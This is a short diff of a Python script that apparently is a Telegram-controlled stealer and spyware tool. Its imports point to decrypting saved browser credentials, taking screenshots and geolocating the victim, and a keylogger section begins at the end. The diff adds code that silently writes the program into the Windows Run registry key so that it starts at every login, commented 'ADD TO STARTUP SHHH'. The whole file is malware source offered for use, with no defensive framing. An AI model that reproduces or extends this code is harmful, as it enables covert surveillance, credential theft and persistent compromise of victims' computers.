@@ -1,14 +1,26 @@
-import os
-try:
-    import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder,time,threading
-    from telebot import types
-    from Crypto.Cipher import AES
-    from datetime import timezone, datetime, timedelta
-except:
-    os.system('pip install requirements.txt')
+import telebot,json,base64,sqlite3,shutil,win32crypt,pyautogui,subprocess,geocoder,time,threading,os,winreg
+from telebot import types
+from Crypto.Cipher import AES
+from datetime import timezone, datetime, timedelta
 
 bot_token = "ENTER_YOUR_BOT_TOKEN_HERE"
 bot = telebot.TeleBot(token=bot_token,parse_mode=None)
+
+#ADD TO STARTUP SHHH........
+def set_run_key(key, value):
+    reg_key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0, winreg.KEY_SET_VALUE)
+    with reg_key:
+        if value is None:
+            winreg.DeleteValue(reg_key, key)
+        else:
+            if '%' in value:
+                var_type = winreg.REG_EXPAND_SZ
+            else:
+                var_type = winreg.REG_SZ
+            winreg.SetValueEx(reg_key, key, 0, var_type, value)
+startup_file = str(os.path.basename(__file__)).replace('.py','.exe')
+set_run_key(startup_file.replace('.exe',''),'"'+os.path.abspath(startup_file)+'"')
 
 #KEYLOGGER
 keylogs_data = ''
